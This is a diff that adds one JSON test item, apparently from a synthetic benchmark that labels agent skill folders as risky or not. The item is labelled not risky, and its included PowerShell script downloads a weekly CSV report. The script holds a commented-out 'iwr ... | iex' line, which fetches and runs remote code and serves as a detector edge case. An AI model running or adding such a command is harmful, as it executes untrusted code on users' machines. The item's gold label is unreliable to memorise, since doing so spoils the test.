@@ -1,0 +1,12 @@
+{
+  "id": "w-skill-ps-download-09",
+  "split": "test",
+  "platform": "windows",
+  "risky": [],
+  "rationale": "LABELLING.md SKILL not risky: fetch-report.ps1 only downloads a CSV with Invoke-WebRequest and never runs it; the iwr | iex line is commented out, which LABELLING.md says does not count; the backtick continuation is harmless.",
+  "source": "synthetic",
+  "files": {
+    "./.claude/skills/report-fetch/SKILL.md": "---\nname: report-fetch\ndescription: Download the weekly CSV report into the data folder.\n---\n\nRun scripts\\fetch-report.ps1 from the project folder.\n",
+    "./.claude/skills/report-fetch/scripts/fetch-report.ps1": "# Download the weekly report CSV. Nothing is executed.\n# iwr https://example.net/tools/helper.ps1 | iex\n$url = 'https://example.net/data/weekly-report.csv'\nNew-Item -ItemType Directory -Force -Path '.\\data' | Out-Null\nInvoke-WebRequest -Uri $url `\n  -OutFile '.\\data\\weekly-report.csv'\n"
+  }
+}
